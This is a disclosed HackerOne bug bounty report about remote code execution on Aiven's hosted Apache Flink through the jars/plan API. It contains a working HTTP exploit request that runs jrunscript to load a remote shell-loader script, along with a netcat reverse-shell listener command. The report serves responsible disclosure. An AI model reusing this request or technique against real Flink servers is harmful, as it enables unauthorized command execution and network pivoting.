---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/apache
  - vuln/cors-misconfig
  - vuln/dos
  - impact/rce
  - trigger/cors-origin
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2022-11-08
submitted: 2021-12-07T12:24:33.484Z
bounty_usd: 6000
votes: 134
cve: []
program: "[[programs/aiven_ltd|Aiven Ltd]]"
reporter: "jarij"
source: "https://hackerone.com/reports/1418891"
title: "Apache Flink RCE via GET jar/plan API Endpoint"
---
# Apache Flink RCE via GET jar/plan API Endpoint

> **Severity:** Critical | **Bounty:** 6,000 USD | **Votes:** 134 | **Program:** Aiven Ltd | **Disclosed:** 2022-11-08

- Report: [https://hackerone.com/reports/1418891](https://hackerone.com/reports/1418891)
- CWE: Command Injection - Generic
- Submitted: 2021-12-07T12:24:33.484Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

Aiven has not restricted access to the GET `jars/{jar_id}/plan` API. This endpoint can be used to load java class files with the specified arguments that are in the java classpath on the server. This can be abused to gain RCE on the Apache Flink Server.

## Steps To Reproduce:

The video below shows how to setup the Apache Flink instance and run the PoC. Feel free to use my VPS which will make triaging somewhat easier (`ssh ████████`, password: `██████`):

█████████


  1. Login to my aiven account: `████`, password: `██████`
  1. Run the SQL job as demonstrated in the video
  1. Open the Flink Web UI and verify that there is a new job in the jobs panel.
  1. Setup netcat reverse shell listener on the VPS: `nc -n -lvp 8888`
  1. Update the poc.py variables to match your instance, if you are not using my Apache Flink instance
  1. Run the poc: `python3 poc.py`
  1. Reverse shell connection should pop up
 1. After connection has been closed, the Apache Flink will crash, so the Aiven service daemon will  have to restart it. Because of this, you have to run new SQL job after every time you run the poc script

# API Request

Here's the HTTP API request that exploits the issue:

```http
GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js")&parallelism=1 HTTP/1.1
Host: ████
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Authorization: Basic █████
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Language: en-US,en;q=0.9,fi;q=0.8
```

## Impact

Attacker can execute commands on the server and use this access to potentially pivot into other resources in the network.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2021-12-09** @jarij: Thanks! I began researching Apache Flink security and potential attack vectors on Monday and noticed that the attacker can specify which java class `public static main` method is executed as the planner method. When grepping the Java SDK  and Flink source code for good gadgets, I found the `com.sun.tools.script.shell.Main`. This is the entrypoint for the jrunscript cli tool: <https://gtfobins.github.io/gtfobins/jrunscript/>
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
